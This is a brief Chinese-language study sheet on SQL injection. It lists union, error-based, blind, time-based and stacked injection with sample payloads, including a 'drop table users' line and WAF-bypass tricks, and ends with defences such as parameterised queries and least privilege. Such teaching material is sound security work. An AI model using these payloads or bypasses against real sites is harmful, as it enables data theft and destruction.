综述：SQL 注入是由于应用程序将用户输入直接拼接进 SQL 语句导致的漏洞。攻击者通过构造恶意 SQL 语句改变原有查询逻辑，从而获取数据库敏感信息。SQL 注入主要分为联合查询注入、报错注入、布尔盲注、时间盲注和堆叠注入。防御方法主要是使用预编译参数化查询、输入校验以及最小权限原则。
# 注入类型
## 经典注入（Union 注入）
SELECT name,price FROM product WHERE id=1  
UNION  
SELECT username,password FROM users

?id=1'
?id=1 and 1=1
?id=1 and 1=2
## 报错注入（Error Based）
利用数据库报错返回数据。
updatexml()  
extractvalue()  
floor()  
exp()
?id=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)
## 布尔盲注（Boolean Blind）
?id=1 and length(database())>5
ascii(substr(database(),1,1))=115
## 时间盲注（Time Based）
sleep()
benchmark()
?id=1 and if(substr(database(),1,1)='s',sleep(5),1)
## 堆叠注入（Stacked Query）
1; drop table users;
- MSSQL
- PostgreSQL

# SQL 注入常见绕过
大小写绕过 UnIoN SeLeCt
编码绕过 %55nion
注释绕过union/**/select
双写绕过ununionion
内联注释/*!50000union select*/

## SQL 注入防御
永远不要拼接 SQL
### 预编译（最有效）
cursor.execute("SELECT * FROM users WHERE id=%s",(id,))
### ORM
- Django ORM
- SQLAlchemy
### 输入校验 
id 只能是数字
### 最小权限
数据库账号不要 root。
###
WAF




